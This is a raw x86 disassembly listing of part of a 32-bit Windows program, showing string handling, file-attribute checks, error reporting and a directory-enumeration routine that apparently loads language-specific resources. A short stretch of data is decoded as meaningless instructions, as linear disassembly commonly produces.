  408bd4:	jne    0x408bdd
  408bd6:	call   0x408800
  408bdb:	mov    esi,eax
  408bdd:	test   esi,esi
  408bdf:	je     0x408c93
  408be5:	mov    ecx,esi
  408be7:	lea    edx,[ecx+0x2]
  408bea:	lea    ebx,[ebx+0x0]
  408bf0:	mov    ax,WORD PTR [ecx]
  408bf3:	add    ecx,0x2
  408bf6:	test   ax,ax
  408bf9:	jne    0x408bf0
  408bfb:	sub    ecx,edx
  408bfd:	sar    ecx,1
  408bff:	cmp    WORD PTR [esi+ecx*2-0x2],0x29
  408c05:	je     0x408c1d
  408c07:	xor    dl,dl
  408c09:	mov    ecx,esi
  408c0b:	call   0x407640
  408c10:	call   0x408800
  408c15:	mov    esi,eax
  408c17:	test   esi,esi
  408c19:	jne    0x408be5
  408c1b:	jmp    0x408c93
  408c1d:	cmp    ecx,0x1
  408c20:	jbe    0x408c5d
  408c22:	xor    eax,eax
  408c24:	mov    WORD PTR [esi+ecx*2-0x2],ax
  408c29:	xor    dl,dl
  408c2b:	mov    ecx,esi
  408c2d:	call   0x407640
  408c32:	jmp    0x408c5d
  408c34:	cmp    WORD PTR [ecx+0x4],0x75
  408c39:	jne    0x408cfe
  408c3f:	mov    BYTE PTR ds:0x40e693,0x1
  408c46:	jmp    0x408c5d
  408c48:	mov    BYTE PTR ds:0x40e692,0x1
  408c4f:	jmp    0x408c5d
  408c51:	mov    edx,ecx
  408c53:	mov    ecx,0x1195
  408c58:	call   0x4071e0
  408c5d:	call   0x408800
  408c62:	mov    ecx,eax
  408c64:	test   ecx,ecx
  408c66:	jne    0x408953
  408c6c:	pop    edi
  408c6d:	mov    eax,ecx
  408c6f:	pop    esi
  408c70:	ret    
  408c71:	push   0x0
  408c73:	mov    edx,0x401a58
  408c78:	mov    ecx,0x5de
  408c7d:	call   0x407010
  408c82:	push   0x0
  408c84:	mov    edx,0x401a70
  408c89:	mov    ecx,0x5de
  408c8e:	call   0x407010
  408c93:	push   0x0
  408c95:	mov    edx,0x401a8c
  408c9a:	mov    ecx,0x5de
  408c9f:	call   0x407010
  408ca4:	call   DWORD PTR ds:0x4243b8
  408caa:	push   DWORD PTR [eax]
  408cac:	mov    edx,esi
  408cae:	mov    ecx,0x5e2
  408cb3:	call   0x407010
  408cb8:	push   0x0
  408cba:	mov    edx,0x4010c0
  408cbf:	mov    ecx,0x5e7
  408cc4:	call   0x407010
  408cc9:	call   0x408740
  408cce:	push   0x0
  408cd0:	mov    edx,0x401a68
  408cd5:	mov    ecx,0x5de
  408cda:	call   0x407010
  408cdf:	push   0x0
  408ce1:	mov    edx,0x401a84
  408ce6:	mov    ecx,0x5de
  408ceb:	call   0x407010
  408cf0:	mov    edx,ecx
  408cf2:	push   0x0
  408cf4:	mov    ecx,0x5de
  408cf9:	call   0x407010
  408cfe:	mov    dx,WORD PTR [ecx+0x4]
  408d02:	push   ecx
  408d03:	call   0x407120
  408d08:	leave  
  408d09:	mov    WORD PTR [eax+0x0],es
  408d0c:	mov    esi,0x3400408a
  408d11:	mov    WORD PTR [eax+0x0],es
  408d14:	and    al,0x8a
  408d16:	inc    eax
  408d17:	add    dl,dl
  408d19:	mov    DWORD PTR [eax+0x0],eax
  408d1c:	cld    
  408d1d:	mov    DWORD PTR [eax+0x0],eax
  408d20:	dec    eax
  408d21:	mov    WORD PTR [eax+0x0],es
  408d24:	push   ecx
  408d25:	mov    WORD PTR [eax+0x0],es
  408d28:	add    BYTE PTR [edi],al
  408d2a:	pop    es
  408d2b:	pop    es
  408d2c:	pop    es
  408d2d:	pop    es
  408d2e:	add    DWORD PTR [edi],eax
  408d30:	pop    es
  408d31:	add    BYTE PTR [edx],al
  408d33:	pop    es
  408d34:	pop    es
  408d35:	pop    es
  408d36:	pop    es
  408d37:	pop    es
  408d38:	pop    es
  408d39:	pop    es
  408d3a:	pop    es
  408d3b:	pop    es
  408d3c:	add    eax,DWORD PTR [edi]
  408d3e:	pop    es
  408d3f:	pop    es
  408d40:	pop    es
  408d41:	pop    es
  408d42:	pop    es
  408d43:	pop    es
  408d44:	pop    es
  408d45:	pop    es
  408d46:	pop    es
  408d47:	pop    es
  408d48:	pop    es
  408d49:	pop    es
  408d4a:	pop    es
  408d4b:	pop    es
  408d4c:	pop    es
  408d4d:	pop    es
  408d4e:	pop    es
  408d4f:	pop    es
  408d50:	pop    es
  408d51:	add    BYTE PTR [edi],al
  408d53:	pop    es
  408d54:	pop    es
  408d55:	pop    es
  408d56:	pop    es
  408d57:	add    al,0x5
  408d59:	pop    es
  408d5a:	pop    es
  408d5b:	pop    es
  408d5c:	pop    es
  408d5d:	pop    es
  408d5e:	pop    es
  408d5f:	push   es
  408d60:	lock mov WORD PTR [eax+0x0],es
  408d64:	mov    eax,ds:0xfd00408b
  408d69:	mov    al,BYTE PTR [eax+0x0]
  408d6c:	in     eax,0x8a
  408d6e:	inc    eax
  408d6f:	add    BYTE PTR [ecx],cl
  408d71:	mov    eax,DWORD PTR [eax+0x0]
  408d74:	icebp  
  408d75:	mov    al,BYTE PTR [eax+0x0]
  408d78:	(bad)  [edx-0x7301ffc0]
  408d7e:	inc    eax
  408d7f:	add    BYTE PTR [eax],al
  408d81:	pop    es
  408d82:	pop    es
  408d83:	pop    es
  408d84:	pop    es
  408d85:	pop    es
  408d86:	pop    es
  408d87:	pop    es
  408d88:	pop    es
  408d89:	pop    es
  408d8a:	pop    es
  408d8b:	pop    es
  408d8c:	pop    es
  408d8d:	pop    es
  408d8e:	pop    es
  408d8f:	pop    es
  408d90:	pop    es
  408d91:	pop    es
  408d92:	pop    es
  408d93:	pop    es
  408d94:	pop    es
  408d95:	pop    es
  408d96:	pop    es
  408d97:	pop    es
  408d98:	pop    es
  408d99:	pop    es
  408d9a:	pop    es
  408d9b:	pop    es
  408d9c:	pop    es
  408d9d:	pop    es
  408d9e:	pop    es
  408d9f:	pop    es
  408da0:	pop    es
  408da1:	pop    es
  408da2:	pop    es
  408da3:	pop    es
  408da4:	pop    es
  408da5:	pop    es
  408da6:	pop    es
  408da7:	pop    es
  408da8:	pop    es
  408da9:	pop    es
  408daa:	pop    es
  408dab:	pop    es
  408dac:	pop    es
  408dad:	pop    es
  408dae:	pop    es
  408daf:	pop    es
  408db0:	pop    es
  408db1:	pop    es
  408db2:	pop    es
  408db3:	pop    es
  408db4:	pop    es
  408db5:	pop    es
  408db6:	pop    es
  408db7:	pop    es
  408db8:	pop    es
  408db9:	pop    es
  408dba:	pop    es
  408dbb:	pop    es
  408dbc:	pop    es
  408dbd:	pop    es
  408dbe:	pop    es
  408dbf:	pop    es
  408dc0:	pop    es
  408dc1:	pop    es
  408dc2:	pop    es
  408dc3:	pop    es
  408dc4:	pop    es
  408dc5:	pop    es
  408dc6:	pop    es
  408dc7:	pop    es
  408dc8:	pop    es
  408dc9:	pop    es
  408dca:	pop    es
  408dcb:	pop    es
  408dcc:	pop    es
  408dcd:	pop    es
  408dce:	pop    es
  408dcf:	pop    es
  408dd0:	pop    es
  408dd1:	pop    es
  408dd2:	pop    es
  408dd3:	pop    es
  408dd4:	pop    es
  408dd5:	pop    es
  408dd6:	pop    es
  408dd7:	pop    es
  408dd8:	pop    es
  408dd9:	pop    es
  408dda:	pop    es
  408ddb:	pop    es
  408ddc:	pop    es
  408ddd:	pop    es
  408dde:	pop    es
  408ddf:	pop    es
  408de0:	pop    es
  408de1:	pop    es
  408de2:	pop    es
  408de3:	pop    es
  408de4:	pop    es
  408de5:	pop    es
  408de6:	pop    es
  408de7:	pop    es
  408de8:	pop    es
  408de9:	add    DWORD PTR [edi],eax
  408deb:	pop    es
  408dec:	add    al,BYTE PTR [ebx]
  408dee:	pop    es
  408def:	pop    es
  408df0:	pop    es
  408df1:	pop    es
  408df2:	add    al,0x5
  408df4:	pop    es
  408df5:	pop    es
  408df6:	push   es
  408df7:	int3   
  408df8:	int3   
  408df9:	int3   
  408dfa:	int3   
  408dfb:	int3   
  408dfc:	int3   
  408dfd:	int3   
  408dfe:	int3   
  408dff:	int3   
  408e00:	push   ebp
  408e01:	mov    ebp,esp
  408e03:	and    esp,0xfffffff8
  408e06:	sub    esp,0x40
  408e09:	mov    eax,ds:0x40e018
  408e0e:	xor    eax,esp
  408e10:	mov    DWORD PTR [esp+0x3c],eax
  408e14:	mov    eax,ds:0x40e644
  408e19:	push   esi
  408e1a:	mov    esi,DWORD PTR [ebp+0x8]
  408e1d:	push   edi
  408e1e:	test   eax,eax
  408e20:	jne    0x408e2e
  408e22:	mov    ecx,esi
  408e24:	call   0x407540
  408e29:	mov    ds:0x40e644,eax
  408e2e:	mov    ecx,DWORD PTR ds:0x40e688
  408e34:	or     ecx,DWORD PTR ds:0x40e68c
  408e3a:	mov    edi,DWORD PTR ds:0x4244b0
  408e40:	jne    0x408e83
  408e42:	push   0x40e658
  408e47:	push   eax
  408e48:	call   edi
  408e4a:	add    esp,0x8
  408e4d:	cmp    eax,0xffffffff
  408e50:	jne    0x408e6f
  408e52:	mov    BYTE PTR ds:0x40e02a,0x0
  408e59:	mov    DWORD PTR ds:0x40e688,0x1
  408e63:	mov    DWORD PTR ds:0x40e68c,0x0
  408e6d:	jmp    0x408e83
  408e6f:	mov    eax,ds:0x40e678
  408e74:	mov    ds:0x40e688,eax
  408e79:	mov    eax,ds:0x40e67c
  408e7e:	mov    ds:0x40e68c,eax
  408e83:	lea    eax,[esp+0x10]
  408e87:	push   eax
  408e88:	push   esi
  408e89:	call   edi
  408e8b:	add    esp,0x8
  408e8e:	cmp    eax,0xffffffff
  408e91:	je     0x408f74
  408e97:	cmp    BYTE PTR ds:0x40e427,0x0
  408e9e:	mov    edi,DWORD PTR ds:0x40e68c
  408ea4:	mov    edx,DWORD PTR ds:0x40e688
  408eaa:	je     0x408ec0
  408eac:	mov    eax,edx
  408eae:	add    eax,0x1
  408eb1:	mov    ecx,edi
  408eb3:	adc    ecx,0x0
  408eb6:	mov    DWORD PTR [esp+0x30],eax
  408eba:	mov    DWORD PTR [esp+0x34],ecx
  408ebe:	jmp    0x408ec8
  408ec0:	mov    ecx,DWORD PTR [esp+0x34]
  408ec4:	mov    eax,DWORD PTR [esp+0x30]
  408ec8:	cmp    ecx,edi
  408eca:	jl     0x408f50
  408ed0:	jg     0x408ed6
  408ed2:	cmp    eax,edx
  408ed4:	jb     0x408f50
  408ed6:	cmp    DWORD PTR [esp+0x24],0x0
  408edb:	je     0x408f50
  408edd:	cmp    BYTE PTR ds:0x40e02b,0x0
  408ee4:	je     0x408f42
  408ee6:	push   0x0
  408ee8:	push   0x40
  408eea:	push   0x8000
  408eef:	lea    eax,[esp+0x18]
  408ef3:	push   esi
  408ef4:	push   eax
  408ef5:	mov    DWORD PTR [esp+0x20],0xffffffff
  408efd:	call   DWORD PTR ds:0x4243bc
  408f03:	add    esp,0x14
  408f06:	test   eax,eax
  408f08:	jne    0x408f88
  408f0a:	push   0x1
  408f0c:	lea    eax,[esp+0xf]
  408f10:	push   eax
  408f11:	push   DWORD PTR [esp+0x14]
  408f15:	call   DWORD PTR ds:0x4243d4
  408f1b:	add    esp,0xc
  408f1e:	cmp    eax,0x1
  408f21:	jne    0x408f9c
  408f23:	mov    al,BYTE PTR [esp+0xb]
  408f27:	push   DWORD PTR [esp+0xc]
  408f2b:	and    al,0xbf
  408f2d:	sub    al,0x16
  408f2f:	neg    al
  408f31:	sbb    al,al
  408f33:	and    BYTE PTR ds:0x40e02b,al
  408f39:	call   DWORD PTR ds:0x4243c0
  408f3f:	add    esp,0x4
  408f42:	mov    BYTE PTR ds:0x40e02a,0x0
  408f49:	mov    ecx,0x6
  408f4e:	jmp    0x408f5c
  408f50:	mov    BYTE PTR ds:0x40e02b,0x0
  408f57:	mov    ecx,0x2
  408f5c:	mov    edx,esi
  408f5e:	call   0x40b8f0
  408f63:	mov    ecx,DWORD PTR [esp+0x44]
  408f67:	pop    edi
  408f68:	pop    esi
  408f69:	xor    ecx,esp
  408f6b:	call   0x40d492
  408f70:	mov    esp,ebp
  408f72:	pop    ebp
  408f73:	ret    
  408f74:	call   DWORD PTR ds:0x4243b8
  408f7a:	push   DWORD PTR [eax]
  408f7c:	mov    edx,esi
  408f7e:	mov    ecx,0x5e2
  408f83:	call   0x407010
  408f88:	call   DWORD PTR ds:0x4243b8
  408f8e:	push   DWORD PTR [eax]
  408f90:	mov    edx,esi
  408f92:	mov    ecx,0x5e2
  408f97:	call   0x407010
  408f9c:	call   DWORD PTR ds:0x4243b8
  408fa2:	push   DWORD PTR [eax]
  408fa4:	mov    edx,esi
  408fa6:	mov    ecx,0x5e1
  408fab:	call   0x407010
  408fb0:	int3   
  408fb1:	int3   
  408fb2:	int3   
  408fb3:	int3   
  408fb4:	int3   
  408fb5:	int3   
  408fb6:	int3   
  408fb7:	int3   
  408fb8:	int3   
  408fb9:	int3   
  408fba:	int3   
  408fbb:	int3   
  408fbc:	int3   
  408fbd:	int3   
  408fbe:	int3   
  408fbf:	int3   
  408fc0:	int3   
  408fc1:	int3   
  408fc2:	int3   
  408fc3:	int3   
  408fc4:	int3   
  408fc5:	int3   
  408fc6:	int3   
  408fc7:	int3   
  408fc8:	int3   
  408fc9:	int3   
  408fca:	int3   
  408fcb:	int3   
  408fcc:	int3   
  408fcd:	int3   
  408fce:	int3   
  408fcf:	int3   
  408fd0:	push   ebp
  408fd1:	mov    ebp,esp
  408fd3:	and    esp,0xfffffff8
  408fd6:	sub    esp,0x6c4
  408fdc:	mov    eax,ds:0x40e018
  408fe1:	xor    eax,esp
  408fe3:	mov    DWORD PTR [esp+0x6c0],eax
  408fea:	push   ebx
  408feb:	push   esi
  408fec:	push   edi
  408fed:	mov    DWORD PTR [esp+0x28],edx
  408ff1:	mov    DWORD PTR [esp+0x34],0x423238
  408ff9:	mov    DWORD PTR [esp+0x24],0x0
  409001:	mov    DWORD PTR [esp+0x20],0x0
  409009:	mov    DWORD PTR [esp+0x1c],0x423234
  409011:	mov    DWORD PTR [esp+0x30],0x60
  409019:	test   ecx,ecx
  40901b:	je     0x409520
  409021:	cmp    WORD PTR [ecx],0x0
  409025:	je     0x409520
  40902b:	test   edx,edx
  40902d:	je     0x409520
  409033:	cmp    WORD PTR [edx],0x0
  409037:	je     0x409520
  40903d:	push   0xffffffff
  40903f:	push   ecx
  409040:	lea    eax,[esp+0x4c8]
  409047:	push   0x104
  40904c:	push   eax
  40904d:	mov    DWORD PTR ds:0x423234,0x0
  409057:	call   DWORD PTR ds:0x42439c
  40905d:	add    esp,0x10
  409060:	test   eax,eax
  409062:	je     0x40907e
  409064:	mov    eax,0x80004005
  409069:	pop    edi
  40906a:	pop    esi
  40906b:	pop    ebx
  40906c:	mov    ecx,DWORD PTR [esp+0x6c0]
  409073:	xor    ecx,esp
  409075:	call   0x40d492
  40907a:	mov    esp,ebp
  40907c:	pop    ebp
  40907d:	ret    
  40907e:	lea    ecx,[esp+0x4c0]
  409085:	lea    edx,[ecx+0x2]
  409088:	jmp    0x409090
  40908a:	lea    ebx,[ebx+0x0]
  409090:	mov    ax,WORD PTR [ecx]
  409093:	add    ecx,0x2
  409096:	test   ax,ax
  409099:	jne    0x409090
  40909b:	sub    ecx,edx
  40909d:	sar    ecx,1
  40909f:	cmp    WORD PTR [esp+ecx*2+0x4be],0x5c
  4090a8:	je     0x4090cb
  4090aa:	push   0xffffffff
  4090ac:	push   0x401aa0
  4090b1:	lea    eax,[esp+0x4c8]
  4090b8:	push   0x104
  4090bd:	push   eax
  4090be:	call   DWORD PTR ds:0x4243d8
  4090c4:	add    esp,0x10
  4090c7:	test   eax,eax
  4090c9:	jne    0x409064
  4090cb:	mov    esi,DWORD PTR ds:0x424330
  4090d1:	lea    eax,[esp+0x4c0]
  4090d8:	mov    DWORD PTR [esp+0x3c],eax
  4090dc:	lea    eax,[esp+0x28]
  4090e0:	mov    DWORD PTR [esp+0x40],eax
  4090e4:	lea    eax,[esp+0x30]
  4090e8:	mov    DWORD PTR [esp+0x44],eax
  4090ec:	lea    eax,[esp+0x1c]
  4090f0:	mov    DWORD PTR [esp+0x48],eax
  4090f4:	lea    eax,[esp+0x34]
  4090f8:	mov    DWORD PTR [esp+0x4c],eax
  4090fc:	lea    eax,[esp+0x20]
  409100:	mov    DWORD PTR [esp+0x50],eax
  409104:	lea    eax,[esp+0x24]
  409108:	mov    DWORD PTR [esp+0x54],eax
  40910c:	xor    eax,eax
  40910e:	mov    WORD PTR [esp+0x2ac],ax
  409116:	mov    DWORD PTR [esp+0x2ae],eax
  40911d:	mov    DWORD PTR [esp+0x2b2],eax
  409124:	mov    WORD PTR [esp+0x2b6],ax
  40912c:	push   0x6
  40912e:	lea    eax,[esp+0x2b0]
  409135:	push   eax
  409136:	mov    edi,0x80070002
  40913b:	push   0x401aa4
  409140:	mov    DWORD PTR [esp+0x1c],edi
  409144:	call   esi
  409146:	test   eax,eax
  409148:	je     0x409186
  40914a:	cmp    eax,0x6
  40914d:	jae    0x409186
  40914f:	lea    eax,[esp+0x10]
  409153:	push   eax
  409154:	push   0xa
  409156:	lea    eax,[esp+0x2b4]
  40915d:	push   eax
  40915e:	lea    ecx,[esp+0x48]
  409162:	call   0x409540
  409167:	mov    edi,DWORD PTR [esp+0x10]
  40916b:	test   edi,edi
  40916d:	jne    0x409186
  40916f:	xor    eax,eax
  409171:	pop    edi
  409172:	pop    esi
  409173:	pop    ebx
  409174:	mov    ecx,DWORD PTR [esp+0x6c0]
  40917b:	xor    ecx,esp
  40917d:	call   0x40d492
  409182:	mov    esp,ebp
  409184:	pop    ebp
  409185:	ret    
  409186:	push   0x0
  409188:	push   0x0
  40918a:	push   0x401ab4
  40918f:	call   esi
  409191:	test   eax,eax
  409193:	jne    0x4091aa
  409195:	push   eax
  409196:	push   eax
  409197:	push   0x100
  40919c:	call   DWORD PTR ds:0x424334
  4091a2:	test   eax,eax
  4091a4:	je     0x409064
  4091aa:	mov    esi,DWORD PTR ds:0x424338
  4091b0:	lea    eax,[esp+0x18]
  4091b4:	push   eax
  4091b5:	push   0x0
  4091b7:	lea    eax,[esp+0x34]
  4091bb:	push   eax
  4091bc:	push   0x34
  4091be:	mov    DWORD PTR [esp+0x28],0x0
  4091c6:	mov    DWORD PTR [esp+0x3c],0x0
  4091ce:	call   esi
  4091d0:	test   eax,eax
  4091d2:	je     0x409064
  4091d8:	mov    eax,DWORD PTR [esp+0x18]
  4091dc:	add    eax,eax
  4091de:	push   eax
  4091df:	push   0x0
  4091e1:	call   DWORD PTR ds:0x42433c
  4091e7:	push   eax
  4091e8:	call   DWORD PTR ds:0x4242c4
  4091ee:	mov    ebx,eax
  4091f0:	test   ebx,ebx
  4091f2:	jne    0x40920e
  4091f4:	mov    eax,0x8007000e
  4091f9:	pop    edi
  4091fa:	pop    esi
  4091fb:	pop    ebx
  4091fc:	mov    ecx,DWORD PTR [esp+0x6c0]
  409203:	xor    ecx,esp
  409205:	call   0x40d492
  40920a:	mov    esp,ebp
  40920c:	pop    ebp
  40920d:	ret    
  40920e:	lea    eax,[esp+0x18]
  409212:	push   eax
  409213:	push   ebx
  409214:	lea    eax,[esp+0x34]
  409218:	push   eax
  409219:	push   0x34
  40921b:	call   esi
  40921d:	test   eax,eax
  40921f:	je     0x409064
  409225:	cmp    WORD PTR [ebx],0x0
  409229:	mov    esi,ebx
  40922b:	je     0x409252
  40922d:	lea    ecx,[ecx+0x0]
  409230:	lea    eax,[esp+0x10]
  409234:	push   eax
  409235:	push   0x10
  409237:	push   esi
  409238:	lea    ecx,[esp+0x48]
  40923c:	call   0x409540
  409241:	mov    edi,DWORD PTR [esp+0x10]
  409245:	test   edi,edi
  409247:	je     0x409252
  409249:	add    esi,0xa
  40924c:	cmp    WORD PTR [esi],0x0
  409250:	jne    0x409230
  409252:	push   ebx
  409253:	push   0x0
  409255:	call   DWORD PTR ds:0x42433c
  40925b:	push   eax
  40925c:	call   DWORD PTR ds:0x4242c0
  409262:	test   edi,edi
  409264:	je     0x40916f
  40926a:	lea    eax,[esp+0x10]
  40926e:	push   eax
  40926f:	push   0xa
  409271:	push   0x401ad8
  409276:	lea    ecx,[esp+0x48]
  40927a:	call   0x409540
  40927f:	cmp    DWORD PTR [esp+0x10],0x0
  409284:	je     0x40916f
  40928a:	push   0xffffffff
  40928c:	lea    eax,[esp+0x4c4]
  409293:	push   eax
  409294:	lea    eax,[esp+0x2c0]
  40929b:	push   0x104
  4092a0:	push   eax
  4092a1:	call   DWORD PTR ds:0x42439c
  4092a7:	add    esp,0x10
  4092aa:	test   eax,eax
  4092ac:	jne    0x409506
  4092b2:	mov    ebx,DWORD PTR ds:0x4243d8
  4092b8:	push   0xffffffff
  4092ba:	push   0x401ae4
  4092bf:	lea    eax,[esp+0x2c0]
  4092c6:	push   0x104
  4092cb:	push   eax
  4092cc:	call   ebx
  4092ce:	add    esp,0x10
  4092d1:	test   eax,eax
  4092d3:	jne    0x409506
  4092d9:	lea    eax,[esp+0x58]
  4092dd:	push   eax
  4092de:	lea    eax,[esp+0x2bc]
  4092e5:	push   eax
  4092e6:	call   DWORD PTR ds:0x424340
  4092ec:	mov    edi,eax
  4092ee:	cmp    edi,0xffffffff
  4092f1:	jne    0x40931e
  4092f3:	call   DWORD PTR ds:0x424344
  4092f9:	test   eax,eax
  4092fb:	jle    0x409525
  409301:	movzx  eax,ax
  409304:	or     eax,0x80070000
  409309:	pop    edi
  40930a:	pop    esi
  40930b:	pop    ebx
  40930c:	mov    ecx,DWORD PTR [esp+0x6c0]
  409313:	xor    ecx,esp
  409315:	call   0x40d492
  40931a:	mov    esp,ebp
  40931c:	pop    ebp
  40931d:	ret    
  40931e:	lea    esi,[esp+0x4c0]
  409325:	lea    ecx,[esi+0x2]
  409328:	jmp    0x409330
  40932a:	lea    ebx,[ebx+0x0]
  409330:	mov    ax,WORD PTR [esi]
  409333:	add    esi,0x2
  409336:	test   ax,ax
  409339:	jne    0x409330
  40933b:	lea    eax,[esp+0x58]
  40933f:	push   eax
  409340:	sub    esi,ecx
  409342:	push   edi
  409343:	sar    esi,1
  409345:	call   DWORD PTR ds:0x424348
  40934b:	test   eax,eax
  40934d:	je     0x4094ac
  409353:	test   BYTE PTR [esp+0x58],0x10
  409358:	je     0x409498
  40935e:	mov    ecx,0x4011c4
  409363:	lea    eax,[esp+0x84]
  40936a:	lea    ebx,[ebx+0x0]
  409370:	mov    dx,WORD PTR [eax]
  409373:	cmp    dx,WORD PTR [ecx]
  409376:	jne    0x409396
  409378:	test   dx,dx
  40937b:	je     0x409392
  40937d:	mov    dx,WORD PTR [eax+0x2]
  409381:	cmp    dx,WORD PTR [ecx+0x2]
  409385:	jne    0x409396
  409387:	add    eax,0x4
  40938a:	add    ecx,0x4
  40938d:	test   dx,dx
  409390:	jne    0x409370
  409392:	xor    eax,eax
  409394:	jmp    0x40939b
  409396:	sbb    eax,eax
  409398:	or     eax,0x1
  40939b:	test   eax,eax
  40939d:	je     0x409498
  4093a3:	mov    ecx,0x401ae8
  4093a8:	lea    eax,[esp+0x84]
  4093af:	nop
  4093b0:	mov    dx,WORD PTR [eax]
  4093b3:	cmp    dx,WORD PTR [ecx]
  4093b6:	jne    0x4093d6
  4093b8:	test   dx,dx
  4093bb:	je     0x4093d2
  4093bd:	mov    dx,WORD PTR [eax+0x2]
  4093c1:	cmp    dx,WORD PTR [ecx+0x2]
  4093c5:	jne    0x4093d6
  4093c7:	add    eax,0x4
  4093ca:	add    ecx,0x4
  4093cd:	test   dx,dx
  4093d0:	jne    0x4093b0
  4093d2:	xor    eax,eax
  4093d4:	jmp    0x4093db
  4093d6:	sbb    eax,eax
  4093d8:	or     eax,0x1
  4093db:	test   eax,eax
  4093dd:	je     0x409498
  4093e3:	push   0x1
  4093e5:	lea    eax,[esp+0x3c]
  4093e9:	push   eax
  4093ea:	lea    eax,[esp+0x1c]
  4093ee:	push   eax
  4093ef:	lea    eax,[esp+0x90]
  4093f6:	push   0x401af0
  4093fb:	push   eax
  4093fc:	call   DWORD PTR ds:0x4243dc
  409402:	add    esp,0x14
  409405:	cmp    eax,0xffffffff
  409408:	je     0x409498
  40940e:	lea    eax,[esi+esi*1]
  409411:	cmp    eax,0x208
  409416:	jae    0x40953a
  40941c:	xor    ecx,ecx
  40941e:	mov    WORD PTR [esp+eax*1+0x2b8],cx
  409426:	push   0xffffffff
  409428:	lea    eax,[esp+0x88]
  40942f:	push   eax
  409430:	lea    eax,[esp+0x2c0]
  409437:	push   0x104
  40943c:	push   eax
  40943d:	call   ebx
  40943f:	add    esp,0x10
  409442:	test   eax,eax
  409444:	jne    0x409498
  409446:	push   0xffffffff
  409448:	push   0x401aa0
  40944d:	lea    eax,[esp+0x2c0]
  409454:	push   0x104
  409459:	push   eax
  40945a:	call   ebx
  40945c:	add    esp,0x10
  40945f:	test   eax,eax
  409461:	jne    0x409498
  409463:	push   0xffffffff
  409465:	push   DWORD PTR [esp+0x2c]
  409469:	lea    eax,[esp+0x2c0]
  409470:	push   0x104
  409475:	push   eax
  409476:	call   ebx
  409478:	add    esp,0x10
  40947b:	test   eax,eax
  40947d:	jne    0x409498
  40947f:	push   DWORD PTR [esp+0x30]
  409483:	push   eax
  409484:	lea    eax,[esp+0x2c0]
  40948b:	push   eax
  40948c:	call   DWORD PTR ds:0x42434c
  409492:	mov    ecx,eax
  409494:	test   ecx,ecx
  409496:	jne    0x4094ce
  409498:	lea    eax,[esp+0x58]
  40949c:	push   eax
  40949d:	push   edi
  40949e:	call   DWORD PTR ds:0x424348
  4094a4:	test   eax,eax
  4094a6:	jne    0x409353
  4094ac:	mov    esi,DWORD PTR [esp+0x10]
  4094b0:	push   edi
  4094b1:	call   DWORD PTR ds:0x424350
  4094b7:	mov    eax,esi
  4094b9:	pop    edi
  4094ba:	pop    esi
  4094bb:	pop    ebx
  4094bc:	mov    ecx,DWORD PTR [esp+0x6c0]
  4094c3:	xor    ecx,esp
  4094c5:	call   0x40d492
  4094ca:	mov    esp,ebp
  4094cc:	pop    ebp
  4094cd:	ret    
  4094ce:	mov    eax,DWORD PTR [esp+0x1c]
  4094d2:	mov    DWORD PTR [eax],ecx
  4094d4:	mov    ecx,DWORD PTR [esp+0x34]
  4094d8:	test   ecx,ecx
  4094da:	je     0x4094e4
  4094dc:	mov    ax,WORD PTR [esp+0x14]
  4094e1:	mov    WORD PTR [ecx],ax
  4094e4:	mov    eax,DWORD PTR [esp+0x20]
  4094e8:	test   eax,eax
  4094ea:	je     0x409502
  4094ec:	lea    ecx,[esp+0x2b8]
  4094f3:	push   ecx
  4094f4:	push   DWORD PTR [esp+0x28]
  4094f8:	push   eax
  4094f9:	call   DWORD PTR ds:0x4244b8
  4094ff:	add    esp,0xc
  409502:	xor    esi,esi
  409504:	jmp    0x4094b0
  409506:	mov    eax,0x80070003
  40950b:	pop    edi
  40950c:	pop    esi
  40950d:	pop    ebx
  40950e:	mov    ecx,DWORD PTR [esp+0x6c0]
  409515:	xor    ecx,esp
  409517:	call   0x40d492
  40951c:	mov    esp,ebp
  40951e:	pop    ebp
  40951f:	ret    
  409520:	mov    eax,0x80070057
  409525:	mov    ecx,DWORD PTR [esp+0x6cc]
  40952c:	pop    edi
  40952d:	pop    esi
  40952e:	pop    ebx
  40952f:	xor    ecx,esp
  409531:	call   0x40d492
  409536:	mov    esp,ebp
  409538:	pop    ebp
  409539:	ret    
  40953a:	call   0x40d6cd
  40953f:	int3   
  409540:	push   ebp
  409541:	mov    ebp,esp
  409543:	sub    esp,0x220
  409549:	mov    eax,ds:0x40e018
  40954e:	xor    eax,ebp
  409550:	mov    DWORD PTR [ebp-0x4],eax
  409553:	mov    eax,DWORD PTR [ebp+0x8]
  409556:	push   esi
  409557:	cmp    WORD PTR [eax],0x0
  40955b:	push   edi
  40955c:	mov    edi,DWORD PTR [ebp+0x10]
  40955f:	mov    esi,ecx
  409561:	je     0x4096b0
  409567:	push   DWORD PTR [ebp+0xc]
  40956a:	lea    ecx,[ebp-0x220]
  409570:	push   ecx
  409571:	push   eax
  409572:	call   DWORD PTR ds:0x4243e0
  409578:	mov    ecx,DWORD PTR [ebp-0x220]
  40957e:	add    esp,0xc
  409581:	cmp    WORD PTR [ecx],0x0
  409585:	mov    DWORD PTR [ebp-0x21c],eax
  40958b:	jne    0x4096b0
  409591:	push   0xa
  409593:	push   0x6
  409595:	lea    ecx,[ebp-0x10]
  409598:	push   ecx
  409599:	movzx  ecx,ax
  40959c:	push   ecx
  40959d:	call   DWORD PTR ds:0x4243e4
  4095a3:	push   0xffffffff
  4095a5:	push   DWORD PTR [esi]
  4095a7:	lea    eax,[ebp-0x218]
  4095ad:	push   0x104
  4095b2:	push   eax
  4095b3:	call   DWORD PTR ds:0x42439c
  4095b9:	add    esp,0x20
  4095bc:	test   eax,eax
  4095be:	jne    0x4096b0
  4095c4:	push   ebx
  4095c5:	mov    ebx,DWORD PTR ds:0x4243d8
  4095cb:	push   0xffffffff
  4095cd:	lea    eax,[ebp-0x10]
  4095d0:	push   eax
  4095d1:	lea    eax,[ebp-0x218]
  4095d7:	push   0x104
  4095dc:	push   eax
  4095dd:	call   ebx
  4095df:	add    esp,0x10
  4095e2:	test   eax,eax
  4095e4:	jne    0x4096af
  4095ea:	push   0xffffffff
  4095ec:	push   0x401aa0
  4095f1:	lea    eax,[ebp-0x218]
  4095f7:	push   0x104
  4095fc:	push   eax
  4095fd:	call   ebx
  4095ff:	add    esp,0x10
  409602:	test   eax,eax
  409604:	jne    0x4096af
  40960a:	mov    eax,DWORD PTR [esi+0x4]
  40960d:	push   0xffffffff
  40960f:	push   DWORD PTR [eax]
  409611:	lea    eax,[ebp-0x218]
  409617:	push   0x104
  40961c:	push   eax
  40961d:	call   ebx
  40961f:	add    esp,0x10
  409622:	test   eax,eax
  409624:	jne    0x4096af
